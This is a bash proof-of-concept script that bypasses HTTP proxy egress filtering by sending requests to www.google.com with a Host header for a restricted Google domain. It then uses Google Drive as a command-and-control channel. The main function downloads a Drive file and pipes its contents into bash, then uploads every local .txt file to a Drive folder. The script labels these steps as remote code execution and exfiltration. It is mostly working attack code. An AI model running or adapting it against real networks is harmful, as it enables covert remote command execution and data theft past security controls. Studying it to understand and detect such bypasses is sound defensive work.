#!/bin/bash

##############################################################################
# Author
# ------
# Paul Calabro
#
# Description
# -----------
# This script demonstrates a possible way to bypass HTTP proxies to
# exfiltrate data and remotely execute code. It accomplishes this by
# requesting that an HTTP proxy server connects to a permitted domain
# while passing an HTTP host header containing a restricted domain. The
# connection to the server succeeds. Traffic is then routed to the name-based
# virtual host, bypassing filtering of egress network traffic.
###############################################################################

cat <<ARTWORK

           /@@@@,
          #@.   (@,
         @@@@      @@,
        *@@@.        ,@&
        @@@@@           %@*
        @  %(             /@.
        @@@&,               (@
        @@*,@@                @#
        @@@@                   *&
        @@@.(                   *@
       *@@.               ,   @# ,@
       /@@@.     .,  *&     #@@.  ,@
       /@ &@@,     &@@      @@ &@# &%
       .@@@        (@*@@&   (      (@
        @* ,/%     #%              /@
        *@@@%             ,&@@@*   ,@
        .@/              @@@@@@@*   @.
         @@@/,          @@@@@@@@&   @.
         @@@@          &,/,,,@@@@   @
         /@@@@#.@     %,*,(*        &*
          (@ &* ,,    &,**%          @
           ,@@@#*@@. ./,,&   *#%*    &*
             .@@%@@      #@@@@@@@@@@@@%(,          #@@@(
               %@@, *@@@@@@@ @@(@@@@@/   ,&@/     #(.@&,@.
                #@%/@@@&  %@ .@.*@@@&@@@@(   &@.    .@%/&
                 @@@  (/  &,  @..@@,   .@@@@(  ./##/. #@
                  %%  #. *@  *@@  .@@.    &@@#@&,..#@&.
                /@%  //  @@  *@&@  .@@&    @&&@(,*,
             %%   .@@.  @%@,  @%,@  %*,@&  ,%     .,,,.,@@.
            @* #@@%   .@/,@   @% @, /# (@. .@@@@@@@@@@&@, @
          *@ ,@#%#   &&. @%  &@ ,@* /&  @  /@.         .@.@
         @& @% ,@   #&  &/  &@  @@% @*  @@.&@@@,      *@@@
        *& @   %/  %&  @*  @*  ,@* /@    ,@@#   *@@.
   (*   ,&,#   /%  && (@  ,@   *@  *@*       /@@,  @&
 &@./@#  @.@  /@   @/ .@.  @,   @#   (@&        *@/,@
@ *& ,*  @@&  @* %@    .@  (@   ,@@    *@%        &&@
@. @@@@@@%@  /%#@/      %(  @.     %@@#@#@,       .@%
 %@@@@*.@%   &@&         @ (@         ,@*(%        *
             &@*        ,@.@.          ,%/&
                        @%@            *%&*
                       @@              @@@
                                      #@@.

##############################################################################
# Proxy Bypass Proof of Concept | v1.0.0 |
##############################################################################
ARTWORK


# NOTE: Import credentials.
#
# The credentials file should contain this information:
#
#   readonly CLIENT_ID='abc'
#   readonly CLIENT_SECRET='def'
#
# More info. regarding obtaining Google API credentials can be found here:
# https://console.developers.google.com/apis/credentials
. .credentials.sh

# NOTE: This helper function is used to extract values from JSON payloads.
#       ARG1: dictionary
#       ARG2: key
function get_json_key {
  dictionary=$1 key=$2
  python -c "print(${dictionary}['${key}'])"
}


# NOTE: This function is used to get OAuth access tokens.
function get_access_token {
    # NOTE: Get the device code, user codes, and verification URL.
    local -r DEVICE_CODE_ENDPOINT='https://www.google.com/o/oauth2/device/code'
    local -r SCOPE=${SCOPE:-'https://docs.google.com/feeds'}
    local -r RESPONSE_1=$(
      curl\
      -s "$DEVICE_CODE_ENDPOINT"\
      -d "client_id=$CLIENT_ID&scope=$SCOPE"\
      -H 'Host: accounts.google.com'
    )
    local -r DEVICE_CODE=$(get_json_key "$RESPONSE_1" 'device_code')
    local -r USER_CODE=$(get_json_key "$RESPONSE_1" 'user_code')
    local -r VERIFICATION_URL=$(get_json_key "$RESPONSE_1" 'verification_url')

    # NOTE: Instruct the user to authorize access to Google Drive from the
    #       script.
    { printf "\n\nVisit %s and enter the code %s to grant access to Google\
        Drive from this script. Hit enter when this step is complete...\n\n"\
        "$VERIFICATION_URL" "$USER_CODE"
    } | sed 's/  */ /g'; read -r

    # NOTE: Save the access and refresh tokens.
    local -r OAUTH_TOKEN_ENDPOINT='https://www.google.com/o/oauth2/token'
    local -r GRANT_TYPE='http://oauth.net/grant_type/device/1.0'
    local -r RESPONSE_2=$(
      curl\
      -s\
      -d "client_id=$CLIENT_ID"\
      -d "&client_secret=$CLIENT_SECRET"\
      -d "&code=$DEVICE_CODE&grant_type=$GRANT_TYPE"\
      -H 'Host: accounts.google.com'\
      "$OAUTH_TOKEN_ENDPOINT"
    )
    (umask 0077;
     get_json_key "$RESPONSE_2" 'access_token' >.access_token;
     get_json_key "$RESPONSE_2" 'expires_in' >.expires_in
     get_json_key "$RESPONSE_2" 'refresh_token' >.refresh_token)
}


# NOTE: This function is used to refresh OAuth access tokens.
function refresh_access_token {
  local -r OAUTH_TOKEN_ENDPOINT='https://www.google.com/o/oauth2/token'
  local -r RESPONSE=$(
    curl\
    -s\
    -d "client_id=$CLIENT_ID"\
    -d "&client_secret=$CLIENT_SECRET"\
    -d "&refresh_token=$(<.refresh_token)"\
    -d "&grant_type=refresh_token"\
    -H 'Host: accounts.google.com'\
    "https://www.google.com/o/oauth2/token"
  )
  (umask 0077;
  get_json_key "$RESPONSE" 'access_token' >.access_token;
  get_json_key "$RESPONSE" 'expires_in' >.expires_in)
}


# NOTE: This function is used to upload files to a Google Drive folder.
function upload_file {
  local -r FILE=$1
  local -r BOUNDARY=$(openssl rand -base64 32)
  local -r PARENT_FOLDER_ID='<REPLACE_ME>'
  local -r RESPONSE=$(
  {
    echo "--$BOUNDARY"
    echo -e "Content-Type: application/json; charset=UTF-8\n"
    echo -e "{
       \"title\": \"$FILE\",
       \"parents\": [ { \"id\": \"$PARENT_FOLDER_ID\" } ]
    }\n"
    echo -e "--$BOUNDARY\n"
    cat "$FILE"
    echo -en "--$BOUNDARY--\n"
  } |
  curl\
    -s\
    -H "Authorization: Bearer $(<.access_token)"\
    -H "Content-Type: multipart/related; boundary=\"$BOUNDARY\""\
    -H 'Host: www.googleapis.com'\
    --data-binary "@-"\
    -o /dev/null\
    -w "%{http_code}"\
    "https://www.google.com/upload/drive/v2/files/?uploadType=multipart"
  )
  printf "  -> %s: %s\n"\
    "$FILE" "$([[ $RESPONSE =~ '200' ]] && echo 'Success' || echo 'Failure' )"
}


# NOTE: This function is used to download files from Google Drive folder.
function download_file {
  local -r FILE=$1
  curl\
    -s\
    -H "Authorization: Bearer $(<.access_token)"\
    -H 'Host: www.googleapis.com'\
    "https://www.google.com/drive/v2/files/$FILE?alt=media"
}


# NOTE: This function is used as the main entrypoint to the script.
function main {
  # NOTE: Get an OAuth access token.
  (test ! -f .access_token && get_access_token) || refresh_access_token

  # NOTE: Run remote code.
  printf '\nRemotely executing commands from Google Docs file:\n';
  commands=$(download_file <REPLACE_ME>)
  printf "\n%s\n---\n" "$commands"
  bash <<<"$commands" | tee stdout.txt

  # NOTE: Exfiltrate data.
  printf '\nExfiltrating files to Google Docs:\n';
  for file in ./*.txt; do upload_file "$(basename "$file")"; done
}


# Let the party begin!
main "$@"
